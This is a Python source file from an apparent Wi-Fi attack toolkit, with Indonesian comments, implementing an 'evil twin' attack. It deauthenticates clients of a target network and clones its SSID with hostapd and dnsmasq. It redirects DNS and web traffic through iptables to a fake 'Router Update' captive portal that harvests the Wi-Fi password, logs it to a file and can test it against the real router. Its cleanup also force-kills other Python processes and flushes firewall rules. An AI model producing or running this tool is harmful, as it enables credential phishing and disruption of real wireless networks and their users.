import os, subprocess, time, threading, logging, sys, socket
from flask import Flask, render_template_string, request, redirect

class EvilTwin:
    def __init__(self, config, colors):
        self.config = config
        self.colors = colors
        self.template_dir = "wifipro/utils/templates"
        self.result_file = "data/evil_results.txt"
        self.app = Flask(__name__)
        self.is_verified = False  
        self.last_attempt = ""    
        
        # Mute log Flask biar terminal gak berisik
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)
        self._setup_routes()

    def _cleanup_system(self):
        """ Membersihkan sisa service & port tanpa membunuh script utama """
        c = self.colors
        print(f"  {c.Y}[*] Hard Cleaning: Resetting Ports & Services...{c.NC}")
        my_pid = os.getpid()
        
        for port in ['80/tcp', '53/udp', '67/udp']:
            os.system(f"sudo fuser -k {port} > /dev/null 2>&1")
        
        os.system("sudo systemctl stop apache2 systemd-resolved > /dev/null 2>&1")
        os.system("sudo killall -9 dnsmasq hostapd wpa_supplicant aireplay-ng > /dev/null 2>&1")

        try:
            pids = subprocess.check_output(["pgrep", "python3"]).decode().split()
            for pid in pids:
                if int(pid) != my_pid:
                    os.system(f"sudo kill -9 {pid} > /dev/null 2>&1")
        except: pass
        
        os.system("sudo iptables -F")
        os.system("sudo iptables -t nat -F")
        os.system("sudo iptables -X")
        time.sleep(2)

    def _setup_routes(self):
        @self.app.route('/')
        def index():
            error = request.args.get('error')
            try:
                with open(f"{self.template_dir}/index.html", "r") as f:
                    html = f.read()
                    if error:
                        msg = '<p style="color:red; font-weight:bold;">Otentikasi Gagal! Password salah.</p>'
                        html = html.replace('<h2>', msg + '<h2>')
                    return render_template_string(html)
            except:
                return "<h2>Router Update</h2><p>Please enter WiFi password to sync.</p>"

        @self.app.route('/login', methods=['POST'])
        def login():
            self.last_attempt = request.form.get('password')
            if self.last_attempt:
                # Password diterima dari web portal
                return "OK" 
            return "Error", 400

        @self.app.route('/check_result')
        def check_result():
            return "<h1>Success</h1>" if self.is_verified else redirect('/?error=1')

    def verify_password(self, essid, password, iface):
        """ Mengetes password ke router asli (Opsional digunakan) """
        c = self.colors
        conf_file = "data/verify.conf"
        if not os.path.exists('data'): os.makedirs('data')
        with open(conf_file, "w") as f:
            f.write(f'ctrl_interface=/var/run/wpa_supplicant\nupdate_config=1\n\nnetwork={{\n  ssid="{essid}"\n  psk="{password}"\n  key_mgmt=WPA-PSK\n}}')
        
        os.system("sudo pkill hostapd dnsmasq")
        self.config.set_managed_mode(iface) 
        os.system(f"sudo ifconfig {iface} up")
        
        try:
            subprocess.Popen(["sudo", "wpa_supplicant", "-B", "-i", iface, "-c", conf_file], 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            for i in range(15):
                time.sleep(1)
                status = subprocess.getoutput(f"sudo wpa_cli -i {iface} status")
                if "wpa_state=COMPLETED" in status:
                    os.system("sudo pkill wpa_supplicant")
                    return True
                if "wpa_state=DISCONNECTED" in status and i > 5:
                    break
        except: pass
        os.system("sudo pkill wpa_supplicant")
        return False

    def start(self, target_essid, channel, target_mac):
        """ VERSI BARBAR: Sekali klik langsung sikat, auto-save, silent logs. """
        c = self.colors
        iface = self.config.iface
        self.is_verified = False
        self.last_attempt = "" 
        
        self._cleanup_system()
        
        # 1. Mulai Deauth & Web Server
        print(f"  {c.R}[*] SIKAT BREE! Memulai Deauth ke {target_mac}...{c.NC}")
        deauth_proc = self.config.deauth.start_silent(target_mac, channel, iface)
        
        # Flask berjalan di thread terpisah agar tidak memblock loop
        web_thread = threading.Thread(target=lambda: self.app.run(host='0.0.0.0', port=80, debug=False, use_reloader=False), daemon=True)
        web_thread.start()

        # 2. Setup Network & DNS Redirect
        print(f"  {c.Y}[*] Konfigurasi Captive Portal Redirect...{c.NC}")
        os.system(f"sudo ifconfig {iface} up 192.168.1.1 netmask 255.255.255.0")
        os.system("sudo iptables -F && sudo iptables -t nat -F")
        os.system("sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 192.168.1.1:53")
        os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80")
        os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:80")

        # 3. Buat Config Hostapd Otomatis
        with open(f"{self.template_dir}/hostapd.conf", "w") as f:
            f.write(f"interface={iface}\ndriver=nl80211\nssid={target_essid}\nhw_mode=g\nchannel={channel}\nauth_algs=1\nwmm_enabled=0\n")

        os.system("sudo systemctl stop NetworkConfig > /dev/null 2>&1")
        
        # Jalankan dnsmasq & hostapd secara SILENT (Tanpa log di terminal)
        dns_p = subprocess.Popen(f"sudo dnsmasq -C {self.template_dir}/dnsmasq.conf -d", 
                               shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        ap_p = subprocess.Popen(f"sudo hostapd {self.template_dir}/hostapd.conf", 
                              shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        print(f"\n  {c.G}[+] EVIL TWIN AKTIF: {c.W}{target_essid}{c.NC}")
        print(f"  {c.INFO} {c.BOLD}Menunggu target masuk jebakan...{c.NC}")

        # 4. MONITORING LOOP (Tampilan Bersih)
        try:
            while True:
                # Cek apakah ada password masuk dari Flask
                if self.last_attempt != "":
                    captured_pwd = self.last_attempt
                    
                    # LOGIKA AUTO-SAVE: Langsung simpan ke succes.txt
                    global_save = "succes.txt"
                    log_entry = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Target: {target_essid} | Pass: {captured_pwd}\n"
                    
                    with open(global_save, "a") as f:
                        f.write(log_entry)
                    
                    # Tampilan Berhasil
                    print(f"\n\n  {c.G}┌──────────────────────────────────────────────────┐{c.NC}")
                    print(f"    {c.BOLD}{c.W}SSID  :{c.NC} {target_essid}")
                    print(f"    {c.BOLD}{c.W}PASS  :{c.NC} {c.G}{captured_pwd}{c.NC}")
                    print(f"    {c.BOLD}{c.W}STATUS:{c.NC} Berhasil disimpan ke {global_save}")
                    print(f"  {c.G}└──────────────────────────────────────────────────┘{c.NC}")
                    
                    break # Keluar dari loop, lanjut ke cleanup
                
                # Animasi biar lu tau script gak hang
                for char in ["/", "-", "\\", "|"]:
                    sys.stdout.write(f"\r  {c.Y}[{char}] {c.W}Mantau trafik di channel {channel}... {c.NC}")
                    sys.stdout.flush()
                    time.sleep(0.25)
                    if self.last_attempt != "": break

        except KeyboardInterrupt:
            print(f"\n  {c.ERR} Dihentikan paksa oleh user.")

        # 5. CLEANUP TKP (Beresin semua service)
        dns_p.terminate()
        ap_p.terminate()
        deauth_proc.terminate()
        os.system("sudo iptables -F && sudo iptables -t nat -F")
        os.system("sudo systemctl start NetworkConfig > /dev/null 2>&1")
        print(f"\n  {c.OK} {c.G}Selesai. Kembali ke Menu Utama.{c.NC}")
        